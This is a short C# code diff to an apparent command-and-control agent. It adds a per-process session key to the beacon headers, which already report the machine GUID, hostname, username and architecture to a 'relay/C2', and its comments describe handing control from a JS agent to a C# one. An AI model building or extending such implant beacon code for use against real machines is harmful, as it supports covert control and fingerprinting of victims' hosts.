@@ -14,6 +14,15 @@ namespace CSharpAgent
         internal const string Capabilities = "1000000000000000";
         internal const int BreedId = 2;
 
+        // A RANDOM per-RUNTIME key — NOT identity. A fresh value on every process launch
+        // (one static initializer per AppDomain; Beacon.Run sends these headers on every
+        // POST), shipped as X-Agent-Session-Key so the relay/C2 can tell agent RUNTIMES
+        // apart on one machine: the machine uuid stays THE identity rows are keyed by, the
+        // session key distinguishes concurrent or succeeding processes — after a 0x0B
+        // UpgradeNetFramework takeover the beacons of the SAME machine uuid carry a NEW
+        // key (ours), making the JS→C# handover visible. Identifies, authorizes nothing.
+        private static readonly string SessionKey = Guid.NewGuid().ToString("D").ToLowerInvariant();
+
         internal static string[][] Build()
         {
             // CANONICAL machine uuid = the MachineGuid an x86 process sees (the Wow6432Node
@@ -47,6 +56,7 @@ namespace CSharpAgent
                 new[] { "X-Agent-Capabilities", Capabilities }
             };
             AddOptional(headers, "X-Agent-Machine-Uuid", guid);
+            AddOptional(headers, "X-Agent-Session-Key", SessionKey);
             AddOptional(headers, "X-Agent-Hostname", Environment.MachineName);
             AddOptional(headers, "X-Agent-Username", Environment.UserName);
             AddOptional(headers, "X-Agent-Arch", machineArch);
